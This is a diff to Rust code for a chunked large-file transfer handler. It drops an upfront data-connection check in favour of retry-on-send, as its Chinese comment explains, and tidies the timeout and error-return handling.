@@ -159,16 +159,15 @@ async fn prepare_get_big_file(context: &Context, file_path: String, data_id: Str
         match file_util::prepare_big_file(&file_path, file_util::FILE_TRANSFER_CHUNK_BYTES).await {
             Ok(value) => value,
             Err(error) => {
-                return RunOutcome::immediate(kik_error(hidden!("准备文件传输失败,error:", error)))
+                return RunOutcome::immediate(kik_error(hidden!("准备文件传输失败,error:", error)));
             }
         };
     let file_size = prepared.size;
     let hash = prepared.hash;
     let stream = prepared.stream;
 
-    if context.find_data_conn().await.is_none() {
-        return RunOutcome::immediate(kik_error(hidden!("Kik数据连接未初始化完成")));
-    }
+    // 不在这里用一次性的“连接池是否为空”快照拒绝命令。数据连接可能恰好处于自动补建窗口；
+    // 控制响应写出后，`send_data_with_id` 会在有界恢复时限内等待并重试尚未发送的完整分片。
     let response = kik_success_big_file(data_id.clone(), file_size, hash);
     let send_context = context.clone();
     let (start_tx, start_rx) = oneshot::channel();
@@ -177,18 +176,14 @@ async fn prepare_get_big_file(context: &Context, file_path: String, data_id: Str
         if start_rx.await.is_err() {
             return;
         }
-        let transfer = match tokio::time::timeout(
+        let transfer = tokio::time::timeout(
             file_util::FILE_TRANSFER_TIMEOUT,
             send_big_file_parts(send_context.clone(), data_id.clone(), stream),
         )
-        .await
-        {
-            Ok(result) => result,
-            Err(_) => Err((
-                common::message::dok::ErrCode::ReadError,
-                anyhow::Error::msg(hidden!("大文件发送超过 4 小时总时限")),
-            )),
-        };
+            .await.unwrap_or_else(|_| Err((
+            common::message::dok::ErrCode::ReadError,
+            anyhow::Error::msg(hidden!("大文件发送超过 4 小时总时限")),
+        )));
         if let Err((code, _error)) = transfer {
             dev_debug!("大文件发送失败: {_error}");
             let encoded = Dok::Err(code).to_buf();
@@ -281,7 +276,7 @@ async fn receive_big_file(
                 return Err(anyhow::Error::msg(hidden!(
                     "发送端报告大文件传输失败: ",
                     common::string_obfuscation::debug(&code)
-                )))
+                )));
             }
         }
     }
